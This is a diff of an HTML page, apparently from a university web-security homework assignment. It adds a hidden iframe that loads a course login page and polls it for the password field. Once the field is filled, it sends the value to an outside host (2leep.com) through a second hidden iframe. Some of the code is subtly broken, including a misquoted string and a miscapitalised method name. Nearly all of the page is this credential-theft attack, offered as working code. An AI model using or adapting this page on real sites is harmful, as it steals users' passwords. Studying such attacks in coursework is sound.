@@ -1,3 +1,25 @@
 <html>
-    <iframe src="http://calculus.sisl.rites.uic.edu:443/6e3357a8/hw4/web-app/Login.jsp" style="display:none"></iframe>
+<body>
+    <iframe id="iframe" src="http://calculus.sisl.rites.uic.edu:443/6e3357a8/hw4/web-app/Login.jsp" style="display:none" onload="onFrameLoad()"></iframe>
+</body>   
+<script>
+    var interval;
+    function onFrameLoad(){
+        interval = setInterval(testPassword,50);
+    }
+    
+    function testPassword(){
+        var password = document.getElementById("iframe").contentWindow.document.getElementById("Password").innerHTML;
+        
+        var addr = "http://2leep.com";
+        if(password!=""){
+            var temp = document.createElement("div");
+            temp.innerHTML += "<iframe src=\"" + addr + "\"?password=" + password + "\" style = \"display:none;\" />";
+            document.body.appendchild(temp);
+            clearInterval(interval);
+        }
+        
+    }
+</script>
+
 </html>
